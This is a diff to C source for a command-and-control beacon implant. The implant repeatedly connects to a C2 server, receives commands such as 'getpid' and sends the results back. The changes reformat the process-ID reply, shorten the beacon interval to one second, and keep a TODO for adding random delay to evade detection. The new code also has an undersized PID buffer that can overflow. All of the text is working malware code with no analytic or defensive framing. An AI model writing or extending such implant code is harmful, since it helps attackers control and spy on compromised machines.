@@ -148,9 +148,17 @@ void StartBeacon(char* C2Server, int C2Port)
 			if (strcmp(RecvData, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
 			else if (strcmp(RecvData, "getpid\n") == 0) {
 				DWORD pid;
-				char buffer[257];
+				char cpid[6];
 				pid = getpid();
-				itoa(pid,buffer,strlen(buffer));
+				// Convert DWORD to char (using base 10)
+				_ultoa(pid,cpid,10);
+				
+				// preparing buffer to send
+				char buffer[20];
+				memset(buffer, 0, sizeof(buffer));
+				strcat(buffer,"Current PID: ");
+				strcat(buffer,cpid);
+
 				send(tcpsock,buffer,strlen(buffer)+1,0);
 				// clear buffers
 				memset(buffer, 0, sizeof(buffer));
@@ -229,7 +237,7 @@ int main(int argc, char **argv)
 		while (true) {
 				// BEACONING
 				// NEED TO IMPLEMENT RANDOM DELAY
-				Sleep(5000); // 1000 ms = 1s
+				Sleep(1000); // 1000 ms = 1s
 
 				StartBeacon(argv[1],port);
 		}
@@ -239,7 +247,7 @@ int main(int argc, char **argv)
 			while (true) {
 				// BEACONING
 				// NEED TO IMPLEMENT RANDOM DELAY
-				Sleep(5000); // 1000 ms = 1s
+				Sleep(1000); // 1000 ms = 1s
 
 				StartBeacon(host,port);
 		}
